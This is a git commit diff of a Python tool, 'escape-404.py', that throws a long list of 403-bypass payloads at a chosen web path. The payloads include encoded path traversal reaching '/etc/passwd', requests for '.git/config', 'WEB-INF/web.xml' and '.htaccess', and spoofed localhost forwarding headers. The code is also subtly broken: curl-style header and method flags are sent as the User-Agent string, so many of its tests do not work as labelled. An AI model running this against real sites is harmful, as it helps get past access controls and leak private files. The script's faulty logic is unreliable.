6a1cd0b49febaf58e574cdd26eb68fefeb99e085
Devendra <79208348+loki-404@users.noreply.github.com>
2024-03-11 23:35:02 +0530

    Update escape-404.py

--- escape-404.py
+++ escape-404.py
@@ -1,10 +1,11 @@
+#!/usr/bin/env python3
+
 import sys
 import subprocess
 import requests
 import argparse
 import json
 import urllib3
-
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Function to display banner
@@ -13,7 +14,7 @@ def show_banner():
     subprocess.run(["figlet", "-f", "standard", "Escape-403"])
     print("                                                -Loki-404")
     print("============================")
-    print(f"Usage: {sys.argv[0]} <url> <path> [-f <file>|--file <file>] [-w|--no-wayback] [-s|--success-only] [-h|--help]")
+    print(f"Usage: {sys.argv[0]} <url> <path> [-w|--no-wayback] [-s|--success-only] [-h|--help] [-f|--file <file_path>]")
 
 # Function to display help
 def show_help():
@@ -22,12 +23,12 @@ def show_help():
     print("Options:")
     print("  -w, --no-wayback   : Skip Wayback Machine URL check")
     print("  -s, --success-only : Show only successful responses (status code 200)")
-    print("  -f, --file <file>  : Specify a file containing multiple paths")
     print("  -h, --help         : Show this help message")
+    print("  -f, --file <file_path> : Read paths from a file")
     sys.exit(0)
 
 # Function to perform a test and display results
-def test_bypass(url, path, option, header):
+def test_bypass(option, header):
     result = requests.get(f"{url}/{path}{option}", headers={"User-Agent": header}, verify=False, allow_redirects=False)
     result_info = f"{result.status_code},{len(result.content)}"
 
@@ -45,82 +46,87 @@ def test_bypass(url, path, option, header):
     else:
         print()
 
+# Function to read paths from a file
+def read_paths_from_file(file_path):
+    with open(file_path, 'r') as file:
+        # Split each line into individual paths
+        return [path.strip() for line in file for path in line.split()]
+
 # Main script
 def main():
     global url, path, show_wayback, success_only
 
     parser = argparse.ArgumentParser(description="Test for 403 Bypass on a given URL and path.")
     parser.add_argument("url", help="The URL to test")
-    parser.add_argument("path", help="The path to test")
+    parser.add_argument("path", nargs='?', default="", help="The path to test")
     parser.add_argument("-w", "--no-wayback", action="store_true", help="Skip Wayback Machine URL check")
     parser.add_argument("-s", "--success-only", action="store_true", help="Show only successful responses (status code 200)")
-    parser.add_argument("-f", "--file", help="Specify a file containing multiple paths")
+    parser.add_argument("-f", "--file", help="Read paths from a file")
     args = parser.parse_args()
 
-    url, path, show_wayback, success_only = args.url, args.path, not args.no_wayback, args.success_only
+    url, show_wayback, success_only = args.url, not args.no_wayback, args.success_only
+
+    # If -f option is provided, read paths from the file
+    if args.file:
+        if args.path:
+            # If a specific path is provided with -f, use only that path
+            paths = [args.path]
+        else:
+            # If -f is provided without a specific path, read all paths from the file
+            paths = read_paths_from_file(args.file)
+    else:
+        # If -f is not provided, use the provided path or an empty string if not provided
+        paths = [args.path] if args.path else []
 
     # Display banner
     show_banner()
 
-    # Check if the file option is provided
-    if args.file:
-        with open(args.file, "r") as file:
-            paths = [line.strip() for line in file.readlines()]
+    print(f"Testing for 403 Bypass on {url}")
+    print()
 
-        for path_entry in paths:
-            print(f"Testing for 403 Bypass on {url}/{path_entry}")
-            print()
-            # Perform tests and display results for each
-            test_bypass("", "")
-            test_bypass("/%2e/", "")
-            test_bypass(f"/{path}/.", "")
-            test_bypass(f"//{path}//", "")
-            test_bypass(f"/./{path}/./", "")
-            test_bypass(f"/{path}", f"-H X-Original-URL: {path}")
-            test_bypass(f"/{path}", "-H X-Custom-IP-Authorization: 127.0.0.1")
-            test_bypass(f"/{path}", "-H X-Forwarded-For: http://127.0.0.1")
-            test_bypass(f"/{path}", "-H X-Forwarded-For: 127.0.0.1:80")
-            test_bypass("", f"-H X-rewrite-url: {path}")
-            test_bypass(f"/{path}%20", "")
-            test_bypass(f"/{path}%09", "")
-            test_bypass(f"/{path}?" "")
-            test_bypass(f"/{path}.html" "")
-            test_bypass(f"/{path}/?anything" "")
-            test_bypass(f"/{path}#" "")
-            test_bypass(f"/{path}" "-H Content-Length:0 -X POST")
-            test_bypass(f"/{path}/*" "")
-            test_bypass(f"/{path}.php" "")
-            test_bypass(f"/{path}.json" "")
-            test_bypass(f"/{path}" "-X TRACE")
-            test_bypass(f"/{path}" "-H X-Host: 127.0.0.1")
-            test_bypass(f"/{path}..;/" "")
-            test_bypass(f"/{path};/" "")
-            test_bypass("","-X TRACE")
-            test_bypass(f"/{path}/..;/etc/passwd" "")
-            test_bypass(f"/{path}/~" "")
-            test_bypass(f"/{path}/~index.html" "")
-            test_bypass(f"/{path}/.git/config" "")
-            test_bypass(f"/{path}/WEB-INF/web.xml" "")
-            test_bypass(f"/{path}/WEB-INF/" "")
-            test_bypass(f"/{path}/.svn/entries" "")
-            test_bypass(f"/{path}/.DS_Store" "")
-            test_bypass(f"/{path}/%252e" "")
-            test_bypass(f"/{path}/.%252e" "")
-            test_bypass(f"/{path}/.%2e" "")
-            test_bypass(f"/{path}/.%2e%2e" "")
-            test_bypass(f"/{path}/.%252e%252e" "")
-            test_bypass(f"/{path}/..../////" "")
-            test_bypass(f"/{path}/.htaccess" "")
-            # ... (continue with other test cases)
-
-    else:
-        print(f"Testing for 403 Bypass on {url}/{path}")
-        print()
-        # Perform tests and display results for each
-        test_bypass(url, path, "", "")
-        test_bypass(url, path, "/%2e/", "")
-        test_bypass(url, path, f"/{path}/.", "")
-        # ... (continue with other test cases)
+    # Perform tests and display results for each path
+    for path in paths:
+        test_bypass("", "")
+        test_bypass("/%2e/", "")
+        test_bypass(f"/{path}/.", "")
+        test_bypass(f"//{path}//", "")
+        test_bypass(f"/./{path}/./", "")
+        test_bypass(f"/{path}", f"-H X-Original-URL: {path}")
+        test_bypass(f"/{path}", "-H X-Custom-IP-Authorization: 127.0.0.1")
+        test_bypass(f"/{path}", "-H X-Forwarded-For: http://127.0.0.1")
+        test_bypass(f"/{path}", "-H X-Forwarded-For: 127.0.0.1:80")
+        test_bypass("", f"-H X-rewrite-url: {path}")
+        test_bypass(f"/{path}%20", "")
+        test_bypass(f"/{path}%09", "")
+        test_bypass(f"/{path}?", "")
+        test_bypass(f"/{path}.html","")
+        test_bypass(f"/{path}/?anything", "")
+        test_bypass(f"/{path}#", "")
+        test_bypass(f"/{path}", "-H Content-Length:0 -X POST")
+        test_bypass(f"/{path}/*", "")
+        test_bypass(f"/{path}.php", "")
+        test_bypass(f"/{path}.json", "")
+        test_bypass(f"/{path}", "-X TRACE")
+        test_bypass(f"/{path}", "-H X-Host: 127.0.0.1")
+        test_bypass(f"/{path}..;/", "")
+        test_bypass(f"/{path};/", "")
+        test_bypass("","-X TRACE")
+        test_bypass(f"/{path}/..;/etc/passwd", "")
+        test_bypass(f"/{path}/~", "")
+        test_bypass(f"/{path}/~index.html", "")
+        test_bypass(f"/{path}/.git/config", "")
+        test_bypass(f"/{path}/WEB-INF/web.xml", "")
+        test_bypass(f"/{path}/WEB-INF/", "")
+        test_bypass(f"/{path}/.svn/entries", "")
+        test_bypass(f"/{path}/.DS_Store", "")
+        test_bypass(f"/{path}/%252e", "")
+        test_bypass(f"/{path}/.%252e", "")
+        test_bypass(f"/{path}/.%2e", "")
+        test_bypass(f"/{path}/.%2e%2e", "")
+        test_bypass(f"/{path}/.%252e%252e", "")
+        test_bypass(f"/{path}/..../////", "")
+        test_bypass(f"/{path}/.htaccess", "")
+        # ... (other test cases)
 
     # Wayback Machine check
     if show_wayback:
@@ -131,9 +137,6 @@ def main():
             wayback_url = wayback_result["archived_snapshots"]["closest"]["url"]
             print(f"  --> Requested URL: {url}/{path}")
             print(f"  --> Wayback Machine Result: Available: {available}, URL: {wayback_url}")
-        else:
-            print(f"  --> Requested URL: {url}/{path}")
-            print("  --> Wayback Machine Result: Not available")
 
 if __name__ == "__main__":
     main()
